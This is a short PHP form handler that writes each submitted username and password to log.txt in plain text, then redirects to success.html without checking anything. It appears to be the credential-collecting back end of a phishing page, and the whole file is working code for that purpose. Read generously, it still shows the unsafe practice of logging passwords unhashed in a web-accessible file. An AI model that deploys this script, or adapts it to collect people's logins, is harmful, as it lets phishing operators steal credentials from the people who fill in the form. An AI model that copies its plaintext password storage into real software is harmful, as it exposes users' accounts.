<?php
// Check if the form was submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Collect the form data
    $username = $_POST['username'];
    $password = $_POST['password'];

    // You can store the data in a file or database. Here we save it to a file.
    $file = fopen("log.txt", "a");
    fwrite($file, "Username: " . $username . "\nPassword: " . $password . "\n\n");
    fclose($file);

    // Redirect to a confirmation page
    header("Location: success.html");
    exit();
}
?>
